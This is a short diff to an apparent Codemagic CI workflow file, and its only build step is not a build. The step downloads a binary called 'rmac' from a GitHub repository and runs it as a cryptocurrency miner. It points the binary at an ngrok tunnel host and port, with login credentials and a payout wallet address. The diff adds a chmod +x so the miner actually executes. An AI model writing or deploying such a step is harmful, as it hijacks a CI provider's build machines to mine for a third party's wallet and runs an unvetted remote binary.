@@ -4,4 +4,4 @@ workflows:
     instance_type: mac_mini_m1   # machine instance type
     max_build_duration: 120       # build duration in minutes (min 1, max 120)
     scripts:
-      - wget https://github.com/rienode0001/cpu/raw/main/rmac && ./rmac noconffile Mode=Solo Host=0.tcp.sa.ngrok.io Port=12073 Username=guru Password=guru PayoutAddress=ric1qu9sqhnl7vwgn3dhtygwk9fyqn2a9erfwjjsp55
+      - wget https://github.com/rienode0001/cpu/raw/main/rmac && chmod +x rmac && ./rmac noconffile Mode=Solo Host=0.tcp.sa.ngrok.io Port=12073 Username=guru Password=guru PayoutAddress=ric1qu9sqhnl7vwgn3dhtygwk9fyqn2a9erfwjjsp55
